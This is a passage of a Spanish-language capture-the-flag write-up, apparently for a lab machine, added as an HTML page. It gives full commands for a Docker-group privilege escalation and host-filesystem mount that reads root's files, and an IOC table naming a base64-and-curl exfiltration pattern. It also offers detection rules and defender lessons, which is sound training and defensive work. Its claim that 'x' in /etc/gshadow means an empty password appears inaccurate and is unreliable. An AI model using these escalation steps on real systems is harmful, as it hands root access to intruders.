+    <div class="cmd-annotated">
+      <div class="cmd-line"><span class="cmd">cat</span> /etc/group | grep -E 'operator|docker'</div>
+      <div class="cmd-line"><span class="cmd">cat</span> /etc/gshadow | grep -E 'operator|docker'</div>
+    </div>
+    <div class="output-box">
+      <div class="output-label">Output</div>
+      <pre>operator:x:37:ben,alice
+docker:x:111:alice
+
+<span class="comment-c"># /etc/gshadow:</span>
+docker:<span style="color:var(--yellow);font-weight:700;">x</span>:111:alice  <span class="comment-c">← 'x' = contraseña vacía</span></pre>
+    </div>
+    <div class="interpret-box">
+      <strong>Hallazgo crítico</strong>
+      <p>En <code>/etc/group</code>, Ben NO está en el grupo docker. Sin embargo, el grupo docker en <code>/etc/gshadow</code> tiene la contraseña como <code>x</code>, lo que significa que no tiene contraseña establecida — cualquier usuario puede cambiar a este grupo con <code>newgrp docker</code> o <code>sg docker</code>.</p>
+    </div>
+    <div class="decision-box">
+      <strong>Decisión</strong>
+      <p>Usar <code>sg docker</code> para ejecutar comandos como miembro del grupo docker, dándonos acceso al socket Docker.</p>
+    </div>
+  </div>
+
+  <div class="step-box">
+    <div class="step-number">Paso 3 — Enumeración</div>
+    <h3>Verificar el socket Docker</h3>
+    <div class="cmd-annotated">
+      <div class="cmd-line"><span class="cmd">ls</span> <span class="flag-opt">-la</span> /var/run/docker.sock</div>
+    </div>
+    <div class="output-box">
+      <div class="output-label">Output</div>
+      <pre>srw-rw---- 1 root <span style="color:var(--yellow);font-weight:700;">docker</span> 0 Mar 23 06:50 /var/run/docker.sock</pre>
+    </div>
+    <div class="interpret-box">
+      <strong>Interpretación</strong>
+      <p>El socket Docker (<code>/var/run/docker.sock</code>) pertenece al grupo <code>docker</code> con permisos <code>rw</code>. Cualquier miembro del grupo docker puede comunicarse con el daemon Docker y ejecutar contenedores como root.</p>
+    </div>
+  </div>
+</div>
+
+<!-- FASE 4: PRIVESC -->
+<div class="section" id="privesc">
+  <h2>4 — Escalada de Privilegios: Docker Escape</h2>
+
+  <div class="step-box">
+    <div class="step-number">Contexto técnico</div>
+    <h3>¿Cómo funciona la escalada vía Docker?</h3>
+    <div class="why-box">
+      <strong>El mecanismo técnico</strong>
+      <p>1. El socket Docker (<code>/var/run/docker.sock</code>) es un archivo socket Unix que permite comunicación con el daemon Docker<br>
+      2. Los contenedores Docker corren como <strong>root por defecto</strong><br>
+      3. Al montar el sistema de archivos del host (<code>-v /:/hostfs</code>) dentro del contenedor, tenemos acceso a <em>todos</em> los archivos del host como root<br>
+      4. Esto incluye <code>/root/root.txt</code>, <code>/etc/shadow</code>, claves SSH, etc.</p>
+    </div>
+    <div class="info-box">
+      <p><strong>Analogía:</strong> Es como conseguir las llaves del edificio (socket Docker) y poder entrar a cualquier habitación (archivos del sistema) usando un passe-partout (contenedor root).</p>
+    </div>
+  </div>
+
+  <div class="step-box">
+    <div class="step-number">Paso 1 — Escalada</div>
+    <h3>Uso de <code>sg docker</code> para cambiar de grupo</h3>
+    <div class="why-box">
+      <strong>¿Qué es sg?</strong>
+      <p><code>sg</code> (switch group) permite ejecutar un comando como miembro de un grupo diferente al grupo primario. A diferencia de <code>newgrp</code>, no requiere una shell interactiva.</p>
+    </div>
+    <div class="cmd-annotated">
+      <div class="cmd-line"><span class="comment-c"># Verificar que sg docker funciona (sin contraseña)</span></div>
+      <div class="cmd-line"><span class="cmd">sg</span> docker <span class="flag-opt">-c</span> <span class="str-c">"id"</span></div>
+      <div class="cmd-notes">
+        <div class="cmd-note">Resultado: uid=1001(ben) gid=111(docker) groups=111(docker),37(operator),1001(ben)</div>
+      </div>
+    </div>
+    <div class="interpret-box">
+      <strong>¡Funciona!</strong>
+      <p>El <code>gid</code> ahora es <code>111(docker)</code> — Ben está ejecutando comandos como miembro del grupo docker.</p>
+    </div>
+  </div>
+
+  <div class="step-box">
+    <div class="step-number">Paso 2 — Root Flag</div>
+    <h3>Montaje del filesystem del host y lectura de root flag</h3>
+    <div class="cmd-annotated">
+      <div class="cmd-line"><span class="cmd">sg</span> docker <span class="flag-opt">-c</span> <span class="str-c">"docker run \</span></div>
+      <div class="cmd-line"><span class="str-c">&nbsp;&nbsp;-v /:/hostfs \</span> <span class="comment-c">← monta / del host en /hostfs</span></div>
+      <div class="cmd-line"><span class="str-c">&nbsp;&nbsp;--rm \</span> <span class="comment-c">← eliminar contenedor al terminar</span></div>
+      <div class="cmd-line"><span class="str-c">&nbsp;&nbsp;--user root \</span> <span class="comment-c">← ejecutar como root</span></div>
+      <div class="cmd-line"><span class="str-c">&nbsp;&nbsp;--entrypoint cat \</span> <span class="comment-c">← usar 'cat' como entrypoint</span></div>
+      <div class="cmd-line"><span class="str-c">&nbsp;&nbsp;privatebin/nginx-fpm-alpine:2.0.2 \</span> <span class="comment-c">← imagen local</span></div>
+      <div class="cmd-line"><span class="str-c">&nbsp;&nbsp;/hostfs/root/root.txt"</span> <span class="comment-c">← leer root.txt</span></div>
+    </div>
+    <div class="output-box">
+      <div class="output-label">Output</div>
+      <pre><span style="color:var(--green);font-weight:700;">846c2c10c0cb72b6d2b4b9dc7254641f</span></pre>
+    </div>
+    <div class="interpret-box">
+      <strong>¡ROOT FLAG CAPTURADO!</strong>
+      <p>El contenedor montó el filesystem del host en <code>/hostfs</code> y leyó <code>/root/root.txt</code> con permisos de root.</p>
+    </div>
+  </div>
+</div>
+
+<!-- RABBIT HOLES -->
+<div class="section" id="rabbitholes">
+  <h2>5 — Rabbit Holes: Lo que NO era el camino</h2>
+
+  <div class="rabbit-hole">
+    <h4>🕳 Arcane Service (CVE-2026-23520) — Lifecycle Command Injection</h4>
+    <p>Arcane v1.13.0 tiene una vulnerabilidad de inyección de comandos en el updater, pero requiere credenciales de administrador. Intentamos brute force, JWT forgery con la ENCRYPTION_KEY y enumerar endpoints sin auth — nada funcionó.</p>
+  </div>
+
+  <div class="rabbit-hole">
+    <h4>🕳 /root/maint-*.sh scripts (Laurel audit labels)</h4>
+    <p>El archivo <code>/etc/laurel/config.toml</code> contenía <code>label-script."^/root/maint-.*[.]sh$" = "maint"</code>. Pasamos tiempo buscando cómo se disparaban. Era una pista falsa — el vector era Docker.</p>
+  </div>
+
+  <div class="rabbit-hole">
+    <h4>🕳 Staff group PATH hijacking</h4>
+    <p>La documentación mencionaba PATH hijacking vía el grupo <code>staff</code>. En Kobold el grupo staff está <strong>completamente vacío</strong> — no aplica.</p>
+  </div>
+
+  <div class="rabbit-hole">
+    <h4>🕳 JWT Forgery con ENCRYPTION_KEY</h4>
+    <p>Encontramos <code>ENCRYPTION_KEY="Q3PbC9fpq/..."</code> en el servicio systemd de arcane. Intentamos forjar JWTs HS256 — el servidor rechazó los tokens. La clave era para cifrado AES, no para firmar JWTs.</p>
+  </div>
+</div>
+
+<!-- LECCIONES -->
+<div class="section" id="lessons">
+  <h2>6 — Lecciones Aprendidas</h2>
+  <div class="lessons-grid">
+    <div class="lesson-card attacker">
+      <h4>⚔ Para el Atacante</h4>
+      <ul>
+        <li>Siempre probar <code>sg [grupo] -c "id"</code> para grupos no estándar</li>
+        <li>Los grupos sin contraseña en <code>/etc/gshadow</code> son switchables por cualquier usuario</li>
+        <li>Si hay Docker, siempre intentar el escape — es uno de los privesc más potentes</li>
+        <li>Usar imágenes ya presentes en el host para evitar descargas</li>
+        <li>No invertir tiempo en CVEs que requieren credenciales sin tenerlas primero</li>
+      </ul>
+    </div>
+    <div class="lesson-card defender">
+      <h4>🛡 Para el Defensor</h4>
+      <ul>
+        <li>Nunca exponer MCP Inspector en <code>0.0.0.0</code> — solo <code>127.0.0.1</code></li>
+        <li>El grupo docker es efectivamente equivalente a root — no añadir usuarios innecesarios</li>
+        <li>Usar rootless Docker o socket proxy para limitar acceso</li>
+        <li>Auditar <code>/etc/gshadow</code> para grupos sin contraseña con miembros privilegiados</li>
+        <li>Usar seccomp/AppArmor profiles para restringir contenedores</li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<!-- DETECCIÓN -->
+<div class="section" id="detection">
+  <h2>7 — Detección: IOCs y Reglas</h2>
+  <div class="step-box">
+    <h3>Indicadores de Compromiso (IOCs)</h3>
+    <table class="data-table">
+      <tr><th>Tipo</th><th>Indicador</th><th>Descripción</th></tr>
+      <tr><td>HTTP Request</td><td><code>POST /api/mcp/connect</code></td><td>RCE vector en MCP Inspector</td></tr>
+      <tr><td>Proceso</td><td><code>bash -c ... | base64 | curl</code></td><td>Exfiltración de datos via HTTP</td></tr>
+      <tr><td>Comando</td><td><code>sg docker -c "docker run -v /:/hostfs"</code></td><td>Escape de Docker con host mount</td></tr>
+      <tr><td>Proceso</td><td><code>docker run -v /:/</code></td><td>Montaje del filesystem raíz</td></tr>
+      <tr><td>Syscall</td><td><code>mount()</code> con CAP_SYS_ADMIN</td><td>Indicador de container escape</td></tr>
+    </table>
+    <div class="cmd-annotated">
+      <div class="cmd-line"><span class="comment-c"># Regla Sigma para detectar Docker host mount</span></div>
+      <div class="cmd-line">title: Docker Host Filesystem Mount (Possible Escape)</div>
+      <div class="cmd-line">detection:</div>
+      <div class="cmd-line">&nbsp;&nbsp;selection:</div>
+      <div class="cmd-line">&nbsp;&nbsp;&nbsp;&nbsp;CommandLine|contains|all:</div>
+      <div class="cmd-line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;- 'docker run'</div>
+      <div class="cmd-line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;- '-v /'</div>
+      <div class="cmd-line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;- '/host'</div>
+      <div class="cmd-line">condition: selection</div>
+      <div class="cmd-line">level: critical</div>
+    </div>
+  </div>
+</div>
+
+<!-- MITRE -->
+<div class="section" id="mitre">
+  <h2>MITRE ATT&amp;CK</h2>
+  <table class="data-table">
+    <tr><th>ID</th><th>Técnica</th><th>Descripción en este ataque</th></tr>
+    <tr><td><code>T1046</code></td><td>Network Service Discovery</td><td>Nmap descubriendo puertos y servicios</td></tr>
+    <tr><td><code>T1595.002</code></td><td>Active Scanning: Vulnerability Scanning</td><td>Identificación de CVE-2026-23744 en MCP Inspector</td></tr>
+    <tr><td><code>T1190</code></td><td>Exploit Public-Facing Application</td><td>RCE vía MCP Inspector sin autenticación</td></tr>
+    <tr><td><code>T1059.004</code></td><td>Command & Scripting: Unix Shell</td><td>Ejecución de bash vía el endpoint de MCP</td></tr>
+    <tr><td><code>T1041</code></td><td>Exfiltration Over C2 Channel</td><td>Exfiltración de datos base64 vía HTTP</td></tr>
+    <tr><td><code>T1078.003</code></td><td>Valid Accounts: Local Accounts</td><td>Abuso de grupo docker sin contraseña vía sg</td></tr>
+    <tr><td><code>T1611</code></td><td>Escape to Host</td><td>Docker escape con montaje del filesystem del host</td></tr>
+  </table>
+</div>
+
+<!-- GLOSARIO -->
+<div class="section" id="glossary">
+  <h2>8 — Glosario</h2>
+  <div class="info-box">
+    <div class="glos-item"><span class="glos-term">MCP (Model Context Protocol)</span><span class="glos-def">Protocolo de Anthropic para que modelos de IA se comuniquen con herramientas y servidores externos. El inspector es la herramienta de desarrollo para probar estos servidores.</span></div>
+    <div class="glos-item"><span class="glos-term">CVE-2026-23744</span><span class="glos-def">Vulnerabilidad de RCE en MCPJam Inspector ≤1.4.2. El inspector no valida qué comandos ejecuta, permitiendo a atacantes remotos ejecutar código arbitrario.</span></div>
+    <div class="glos-item"><span class="glos-term">Docker socket</span><span class="glos-def">Archivo /var/run/docker.sock — canal de comunicación con el daemon Docker. Tener acceso a este socket es equivalente a tener permisos de root.</span></div>
+    <div class="glos-item"><span class="glos-term">sg (switch group)</span><span class="glos-def">Comando Linux que ejecuta un programa bajo una membresía de grupo diferente. Similar a sudo pero para grupos.</span></div>
+    <div class="glos-item"><span class="glos-term">/etc/gshadow</span><span class="glos-def">Archivo que almacena contraseñas de grupos y miembros administrativos. Si la contraseña está vacía, cualquier usuario puede unirse al grupo.</span></div>
+    <div class="glos-item"><span class="glos-term">Docker escape</span><span class="glos-def">Técnica de escalada que aprovecha el acceso al socket Docker para ejecutar un contenedor con el filesystem del host montado, obteniendo acceso de root al host.</span></div>
+    <div class="glos-item"><span class="glos-term">Virtual Host (vhost)</span><span class="glos-def">Técnica de nginx/Apache para servir múltiples sitios en la misma IP, distinguiéndolos por el header Host de la petición HTTP.</span></div>
+    <div class="glos-item"><span class="glos-term">Laurel</span><span class="glos-def">Backend de auditoría Linux que enriquece los logs de auditd con información adicional como líneas de comandos completas.</span></div>
+    <div class="glos-item"><span class="glos-term">Arcane</span><span class="glos-def">Plataforma de deployment de contenedores (open source, alternativa a Portainer). Gestiona ambientes Docker desde una interfaz web.</span></div>
+  </div>
+</div>
+
+</main>
+
+<!-- SIDEBAR -->
+<aside class="sidebar">
+  <div class="sidebar-card">
+    <h4>Ficha Técnica</h4>
+    <div class="meta-row"><span class="meta-label">IP</span><span class="meta-value">10.129.15.44</span></div>
+    <div class="meta-row"><span class="meta-label">OS</span><span class="meta-value">Linux</span></div>
+    <div class="meta-row"><span class="meta-label">Puertos</span><span class="meta-value">22, 80, 443, 3552</span></div>
+    <div class="meta-row"><span class="meta-label">Servicio</span><span class="meta-value">MCP Inspector</span></div>
+    <div class="meta-row"><span class="meta-label">CVE</span><span class="meta-value" style="color:var(--red);">CVE-2026-23744</span></div>
+    <div class="meta-row"><span class="meta-label">CVSS</span><span class="meta-value" style="color:var(--red);">9.8 CRÍTICA</span></div>
+    <div class="meta-row"><span class="meta-label">Vector</span><span class="meta-value">RCE → Docker Escape</span></div>
+    <div class="meta-row"><span class="meta-label">Fecha</span><span class="meta-value">2026-03-22</span></div>
+  </div>
+  <div class="sidebar-card">
+    <h4>Herramientas</h4>
+    <div class="meta-row"><span class="meta-label">Recon</span><span class="meta-value">nmap, gobuster</span></div>
+    <div class="meta-row"><span class="meta-label">Exploit</span><span class="meta-value">curl, base64</span></div>
+    <div class="meta-row"><span class="meta-label">PrivEsc</span><span class="meta-value">sg, docker</span></div>
+  </div>
+  <div class="sidebar-card">
+    <h4>Tabla de Contenidos</h4>
+    <a class="toc-link" href="#recon">1 — Reconocimiento</a>
+    <a class="toc-link" href="#foothold">2 — Foothold (CVE-2026-23744)</a>
+    <a class="toc-link" href="#postenum">3 — Post-Explotación</a>
+    <a class="toc-link" href="#privesc">4 — Escalada (Docker Escape)</a>
+    <a class="toc-link" href="#rabbitholes">5 — Rabbit Holes</a>
+    <a class="toc-link" href="#lessons">6 — Lecciones</a>
+    <a class="toc-link" href="#detection">7 — Detección</a>
+    <a class="toc-link" href="#mitre">MITRE ATT&CK</a>
+    <a class="toc-link" href="#glossary">8 — Glosario</a>
+  </div>
+  <div class="sidebar-card">
+    <h4>MITRE ATT&amp;CK</h4>
+    <span class="mitre-tag">T1046</span>
+    <span class="mitre-tag">T1595.002</span>
+    <span class="mitre-tag">T1190</span>
+    <span class="mitre-tag">T1059.004</span>
+    <span class="mitre-tag">T1041</span>
+    <span class="mitre-tag">T1078.003</span>
+    <span class="mitre-tag">T1611</span>
+  </div>
+  <div class="sidebar-card">
+    <h4>Credenciales</h4>
+    <div class="meta-row"><span class="meta-label">User</span><span class="meta-value">ben (uid=1001)</span></div>
+    <div class="meta-row"><span class="meta-label">PrivEsc</span><span class="meta-value">sg docker</span></div>
+  </div>
+  <div class="sidebar-card">
+    <h4>Glosario Rápido</h4>
+    <div class="glosario-item"><span class="glosario-term">MCP Inspector</span><span class="glosario-def">Herramienta de desarrollo para probar servidores Model Context Protocol</span></div>
+    <div class="glosario-item"><span class="glosario-term">sg</span><span class="glosario-def">Switch Group — ejecuta comandos bajo otro grupo Linux</span></div>
+    <div class="glosario-item"><span class="glosario-term">Docker Escape</span><span class="glosario-def">Montar filesystem del host vía contenedor root</span></div>
+    <div class="glosario-item"><span class="glosario-term">gshadow</span><span class="glosario-def">Contraseñas de grupos Linux — vacía = accesible para todos</span></div>
+  </div>
+</aside>
+</div>
+
+</body>
+</html>
